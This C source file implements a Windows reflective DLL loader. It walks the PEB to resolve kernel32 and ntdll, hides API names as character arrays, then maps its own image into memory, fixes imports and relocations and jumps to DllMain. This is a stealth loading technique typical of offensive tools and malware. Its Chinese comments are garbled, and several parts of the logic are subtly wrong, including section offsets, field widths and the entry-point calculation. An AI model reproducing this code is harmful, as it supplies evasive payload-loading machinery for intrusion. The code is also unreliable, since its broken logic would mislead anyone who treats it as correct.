#include "Reflective.h"

WCHAR ToLowerCaseW(WCHAR ch) {
	if (ch >= L'A' && ch <= L'Z') {
		return ch + (L'a' - L'A');
	}
	return ch;
}

HANDLE GetPEAddress() {
	PVOID funcAddress = _ReturnAddress();
	for (DWORD offset = 0;; offset++) {
		if (*((BYTE*)funcAddress - offset) == 0x5A) {
			if (*((BYTE*)funcAddress - (offset + 1)) == 0x4D) {
				LONG NToffset = *(PLONG)((BYTE*)funcAddress - offset + 0x3b) - 1;
				if (*(PDWORD)((BYTE*)funcAddress - offset + NToffset) == IMAGE_NT_SIGNATURE) {
					return (HANDLE)((BYTE*)funcAddress - (offset + 1));
				}
			}
		}
	}
}

WORD CompareStringW(PWSTR p1, PWSTR p2) {
	while (*p1 || *p2) {
		WCHAR lower_p1 = ToLowerCaseW(*p1);
		WCHAR lower_p2 = ToLowerCaseW(*p2);

		if (lower_p1 != lower_p2) {
			return lower_p1 - lower_p2;
		}
		++p1;
		++p2;
	}
	return 0;  
}

CHAR ToLowerCaseA(CHAR ch) {
	if (ch >= 'A' && ch <= 'Z') {
		return ch + ('a' - 'A');
	}
	return ch;
}

WORD CompareStringA(PSTR p1, PSTR p2) {
	while (*p1 || *p2) {
		CHAR lower_p1 = ToLowerCaseA(*p1);
		CHAR lower_p2 = ToLowerCaseA(*p2);

		if (lower_p1 != lower_p2) {
			return lower_p1 - lower_p2;
		}
		++p1;
		++p2;
	}
	return 0;
}


HANDLE _GetModuleHandle(LPWSTR lpModuleName) {
#ifdef _WIN64
	LPVOID PPEB =(LPVOID)__readgsqword(0x60);
	LPVOID PPLD = *(LPVOID*)((BYTE*)PPEB + 0x18);
	LPVOID PILOML = *(LPVOID*)((BYTE*)PPLD + 0x10);
	while (PILOML) {
		UNICODE_STRING FullDllName = *(UNICODE_STRING*)((BYTE*)PILOML + 0x48);
		if (FullDllName.Length != 0) {
			if (CompareStringW(FullDllName.Buffer,lpModuleName) == 0) {
				return (HANDLE)(*(LPVOID*)((BYTE*)PILOML + 0x30));
			}
			PILOML = *(LPVOID*)PILOML;
		}
		else
		{
			break;
		}
	}
	return NULL;

#else
	LPVOID PPEB = NULL;
	__asm {
		mov eax, fs:[30h]
		mov PPEB, eax
	}
	if (PPEB == NULL) {
		return NULL;
	}
	LPVOID PPLD = *(LPVOID*)((BYTE*)PPEB + 0x0c);
	LPVOID PILOML = *(LPVOID*)((BYTE*)PPLD + 0x0c);
	while (PILOML) {
		UNICODE_STRING FullDllName = *(UNICODE_STRING*)((BYTE*)PILOML + 0x24);
		if (FullDllName.Length != 0) {
			if (CompareStringW(FullDllName.Buffer, lpModuleName) == 0) {
				return (HANDLE)(*(LPVOID*)((BYTE*)PILOML + 0x18));
			}
			PILOML = *(LPVOID*)PILOML;
		}
		else
		{
			break;
		}
	}
	return NULL;
#endif 
}

FARPROC _GetProcAddress(LPVOID hModule, LPSTR lpProcName) {
#ifdef _WIN64
	LPVOID pNt = ((BYTE*)hModule + (*(LONG*)((BYTE*)hModule + 0x3C)));
	LPVOID pExport = ((BYTE*)hModule + (*(LONG*)((BYTE*)pNt + 0x88)));
	DWORD Base = *(PDWORD)((BYTE*)pExport + 0x10);
	DWORD NumberOfFunctions = *(PDWORD)((BYTE*)pExport + 0x14);
	PDWORD pENT = (PDWORD)((BYTE*)hModule + (*(DWORD*)((BYTE*)pExport + 0x20)));
	PDWORD pEAT = (PDWORD)((BYTE*)hModule + (*(DWORD*)((BYTE*)pExport + 0x1C)));
	PDWORD pEIT = (PDWORD)((BYTE*)hModule + (*(DWORD*)((BYTE*)pExport + 0x24))); 
	for (Base;Base<=NumberOfFunctions;Base++) {
		if (CompareStringA((PSTR)((BYTE*)hModule + (*(pENT + Base))), lpProcName) == 0) {
			WORD index = (*(WORD*)((BYTE*)pEIT + (Base*2)));
			return (FARPROC)((BYTE*)hModule + (*(pEAT + index)));
		}
	}
	return NULL;
#else
	LPVOID pNt = ((BYTE*)hModule + (*(LONG*)((BYTE*)hModule + 0x3C)));
	LPVOID pExport = ((BYTE*)hModule + (*(LONG*)((BYTE*)pNt + 0x78)));
	DWORD Base = *(PDWORD)((BYTE*)pExport + 0x10);
	DWORD NumberOfFunctions = *(PDWORD)((BYTE*)pExport + 0x14);
	PDWORD pENT = (PDWORD)((BYTE*)hModule + (*(DWORD*)((BYTE*)pExport + 0x20)));
	PDWORD pEAT = (PDWORD)((BYTE*)hModule + (*(DWORD*)((BYTE*)pExport + 0x1C)));
	PDWORD pEIT = (PDWORD)((BYTE*)hModule + (*(DWORD*)((BYTE*)pExport + 0x24)));
	for (Base; Base <= NumberOfFunctions; Base++) {
		if (CompareStringA((PSTR)((BYTE*)hModule + (*(pENT + Base))), lpProcName) == 0) {
			WORD index = (*(WORD*)((BYTE*)pEIT + (Base * 2)));
			return (FARPROC)((BYTE*)hModule + (*(pEAT + index)));
		}
	}
	return NULL;
#endif
}

BOOL ReflectiveLoader() {
	/*
		1.�������: Ҫ�õ���DLL�ͺ������ơ�����ָ��
	*/
	WCHAR Kernel32[] = { L'c',L':',L'\\',L'w',L'i',L'n',L'd',L'o',L'w',L's',L'\\',L's',L'y',L's',L't',L'e',L'm',L'3',L'2',L'\\',L'k',L'e',L'r',L'n',L'e',L'l',L'3',L'2',L'.',L'd',L'l',L'l',L'\0' };
	WCHAR Ntdll[] = { L'c',L':',L'\\',L'w',L'i',L'n',L'd',L'o',L'w',L's',L'\\',L's',L'y',L's',L't',L'e',L'm',L'3',L'2',L'\\',L'n',L't',L'd',L'l',L'l',L'.',L'd',L'l',L'l',L'\0' };
	CHAR VirtualAlloc[] = { 'v','i','r','t','u','a','l','a','l','l','o','c','\0' };
	CHAR VirtualProtect[] = { 'v','i','r','t','u','a','l','p','r','o','t','e','c','t','\0' };
	CHAR LoadLibraryA[] = { 'l','o','a','d','l','i','b','r','a','r','y','a','\0' };
	CHAR GetProcAddress[] = { 'g','e','t','p','r','o','c','a','d','d','r','e','s','s','\0'};
	CHAR NtFlushInstructionCache[] = { 'n','t','f','l','u','s','h','i','n','s','t','r','u','c','t','i','o','n','c','a','c','h','e','\0' };
	HANDLE hKernel32 = _GetModuleHandle(Kernel32);
	PVirtualAlloc _VirtualAlloc = (PVirtualAlloc)_GetProcAddress(hKernel32, VirtualAlloc);
	PVirtualProtect _VirtualProtect = (PVirtualProtect)_GetProcAddress(hKernel32, VirtualProtect);
	PLoadLibraryA _LoadLibraryA = (PLoadLibraryA)_GetProcAddress(hKernel32, LoadLibraryA);
	PGetProcAddress __GetProcAddress = (PGetProcAddress)_GetProcAddress(hKernel32, GetProcAddress);
	PNtFlushInstructionCache _NtFlushInstructionCache = (PNtFlushInstructionCache)_GetProcAddress(_GetModuleHandle(Ntdll), NtFlushInstructionCache);

	/*
		2.����PE�ļ�����ȡ�ؼ���Ϣ
	*/
	LPVOID PEAddress = GetPEAddress(); //PE��ַ
	LPVOID NTHeaders = ((BYTE*)PEAddress + *(PLONG)((BYTE*)PEAddress + 0x3C)); //NTͷ
	LPVOID NTOptionHeader = ((BYTE*)NTHeaders + 0x18); //NT��չͷ
	DWORD AddressOfEntryPoint = *(PWORD)((BYTE*)NTOptionHeader + 0x10); //������ڵ�ַRVA
	ULONG64 AddressOfEntryPointOffset = (ULONG64)((BYTE*)NTOptionHeader + 0x10) - (ULONG64)PEAddress; //������ڵ�ַƫ����
	ULONG64 ImageBaseOffset = (ULONG64)((BYTE*)NTOptionHeader + 0x18) - (ULONG64)PEAddress; //ImageBase��ƫ����
	ULONG64 ImageBase = *(PULONG64)((BYTE*)NTOptionHeader + 0x18); //PE��Ĭ��ӳ���ַ
	DWORD SectionAlignment = *(PWORD)((BYTE*)NTOptionHeader + 0x20); //�ڴ�����С
	DWORD FileAlignment = *(PWORD)((BYTE*)NTOptionHeader + 0x24); //���̶����С
	DWORD SizeOfImage = *(PWORD)((BYTE*)NTOptionHeader + 0x34); //ӳ���ļ��ܴ�С
	DWORD SizeOfHeaders = *(PWORD)((BYTE*)NTOptionHeader + 0x38); //PEͷ�ܴ�С
	WORD NumberOfSections = *(PWORD)((BYTE*)NTHeaders + 0x10); //�ڵ�����
	LPVOID PImageSectionHeader = ((BYTE*)NTOptionHeader + 0xf0); //�ڱ�ָ��

	/*
		3.�����ڴ�ռ䣬��PE�ļ����ݸ���
	*/
	LPVOID DLLHandle = _VirtualAlloc(NULL, SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE); //�����ڴ�õ�DLL���
	if (DLLHandle == NULL) {
		return FALSE;
	}
	for (DWORD i = 0; i < SizeOfHeaders; i++) {
		*((BYTE*)DLLHandle + i) = *((BYTE*)PEAddress + i); //�Ȱ�PEͷ���ƹ�ȥ
	}
	*(PULONG64)((BYTE*)DLLHandle + ImageBaseOffset) = (ULONG64)DLLHandle; //����ӳ���ַ
	for (WORD i = 0; i < NumberOfSections; i++) {  //�ٸ���ÿ����
		DWORD VirtualSize = *(PDWORD)((BYTE*)PImageSectionHeader + i * 0x28 + 0xC); //�ڴ��нڵ�RVA
		DWORD PointerToRawData = *(PDWORD)((BYTE*)PImageSectionHeader + i * 0x28 + 0xC); //�����нڵ�RVA
		DWORD SizeOfRawData = *(PDWORD)((BYTE*)PImageSectionHeader + i * 0x28 + 0x14); //���ڴ����ϵĴ�С
		for (DWORD j = 0; j < SizeOfRawData; j++) {
			*((BYTE*)DLLHandle + VirtualSize + j) = *((BYTE*)PEAddress + PointerToRawData + j); //���ƽڵ�����
		}
	}

	/*
		4.�޸������(IAT)
	*/
	LPVOID PImageImportDescriptor = ((BYTE*)NTOptionHeader + 0x78); //����Ŀ¼��ָ��
	DWORD ImageImportDescriptorVirtualAddress = *(PDWORD)PImageImportDescriptor; //�����RVA
	DWORD ImageImportDescriptorSize = *((PDWORD)PImageImportDescriptor + 1); //������С
	SIZE_T DLLcount = (ImageImportDescriptorSize / sizeof(IMAGE_DATA_DIRECTORY)) - 1; //��Ҫ����DLL������
	LPVOID PImageImport = ((BYTE*)DLLHandle + ImageImportDescriptorVirtualAddress); //ʵ�ʵ�����ַ
	for (DWORD i = 0; i < DLLcount; i++) {
		DWORD NameRVA = *(PDWORD)((BYTE*)PImageImport + i * 0x14 + 0xC); //DLL���Ƶ�RVA
		LPSTR DLLName = ((CHAR*)DLLHandle + NameRVA); //��ȡDLL����
		HMODULE DLLHmodule = _LoadLibraryA(DLLName);//����DLL
		if (DLLHmodule == NULL) {
			return FALSE;
		}
		DWORD FirstThunk = *(PDWORD)((BYTE*)PImageImport + i * 0x14 + 0x10); //��ȡ���뺯����(IAT)RVA
		DWORD OriginalFirstThunk = *(PDWORD)((BYTE*)PImageImport + i * 0x14); //��ȡINT��RVA
		LPVOID PIAT = ((BYTE*)DLLHandle + FirstThunk); //IAT��ĵ�ַ
		LPVOID PINT = ((BYTE*)DLLHandle + OriginalFirstThunk); //INT��ĵ�ַ
		for (DWORD j = 0;;j++) {
			if (*((PULONG64)PIAT + j ) == 0) {
				break;
			}
			if (IS_HIGHEST_BIT_SET(*((PULONG64)PINT + j))) { //������λΪ1�����ʾ���������
				WORD ordinal = *(PWORD)((PULONG64)PINT + j);
				FARPROC funcAddress = __GetProcAddress(DLLHmodule,(LPCSTR)ordinal); //ͨ����Ż�ȡ������ַ
				if (funcAddress == NULL) {
					return FALSE;
				}
				*((PULONG64)PIAT + j) = (ULONG64)funcAddress; //�޸�IAT��ĵ�ַ
			}
			else //������λΪ0�����ʾ��IMAGE_IMPORT_BY_NAME��RVA
			{
				ULONG64 ImageThunkRVA = *((PULONG64)PINT + j);
				LPCSTR funcName = (LPCSTR)((BYTE*)DLLHandle + ImageThunkRVA + 2); //�������� 
				FARPROC funcAddress = __GetProcAddress(DLLHmodule, funcName); //ͨ���������ƻ�ȡ������ַ
				if (funcAddress == NULL) {
					return FALSE;
				}
				*((PULONG64)PIAT + j) = (ULONG64)funcAddress; //�޸�IAT��ĵ�ַ
			}
		}
	}

	/*
		5.�޸��ض�λ��
	*/
	LPVOID PImageBaseRelocation = ((BYTE*)NTOptionHeader + 0x98); //�ض�λĿ¼��ָ��
	DWORD ImageBaseRelocationVirtualAddress = *(PDWORD)PImageBaseRelocation; //�ض�λ��RVA
	DWORD ImageBaseRelocationSize = *((PDWORD)PImageBaseRelocation + 1); //�ض�λ���С
	ULONG64 Difference = (ULONG64)DLLHandle - ImageBase; //����ӳ���ַ��ֵ
	LPVOID RelocationAddress = ((BYTE*)DLLHandle + ImageBaseRelocationVirtualAddress);  //�ض�λ���ַ
	DWORD UsedSize = 0; //��ʹ���ض�λ���С
	do {
		RelocationAddress = (BYTE*)(RelocationAddress) + UsedSize;
		LPVOID ActualAddress = ((BYTE*)DLLHandle + *(PDWORD)RelocationAddress); //ʵ��Ҫ�ض�λ�ĵ�ַ
		DWORD RelocationCount = (*((PDWORD)RelocationAddress + 1) - 8) / 2; //Ҫ�ض�λ��ַ������
		for (DWORD i = 0; i < RelocationCount; i++) {
			DWORD Offset = (DWORD)EXTRACT_LOW_12_BITS(*((PWORD)((BYTE*)RelocationAddress + 8) + i));//��ȡ��12λ�õ��ض�λ��ַƫ����
			*(PULONG64)((BYTE*)ActualAddress + Offset) += Difference; //������ַΪ�ض�λ��ַ
		}
		UsedSize += *((PDWORD)RelocationAddress + 1);
	} while (ImageBaseRelocationSize > UsedSize);

	/*
		6.Ϊ�ڷ�����ȷ���ڴ�����
	*/
	for (WORD i = 0; i < NumberOfSections; i++) { 
		DWORD VirtualSize = *(PDWORD)((BYTE*)PImageSectionHeader + i * 0x28 + 0xC); //�ڴ��нڵ�RVA
		DWORD SizeOfRawData = *(PDWORD)((BYTE*)PImageSectionHeader + i * 0x28 + 0x14); //���ڴ����ϵĴ�С
		DWORD Characteristics = *(PDWORD)((BYTE*)PImageSectionHeader + i * 0x28 + 0x24); //�ڵ��ڴ�����
		DWORD OldProtect = 0;
		if (!_VirtualProtect(((BYTE*)DLLHandle + VirtualSize), SizeOfRawData, Characteristics,&OldProtect)) {
			return FALSE;
		}
	}

	/*
		7.����DLL��ں���
	*/
	if (!_NtFlushInstructionCache((HANDLE)-1, NULL, NULL)) { //ˢ�µ�ǰ���̵�ָ���
		return FALSE;
	}
	PDllMain _DllMain = (PDllMain)((BYTE*)DLLHandle + AddressOfEntryPointOffset); //DLL��ں���ָ��
	return _DllMain((HINSTANCE)DLLHandle,DLL_PROCESS_ATTACH,NULL); //ת��DLL��ں�����ʼִ��
}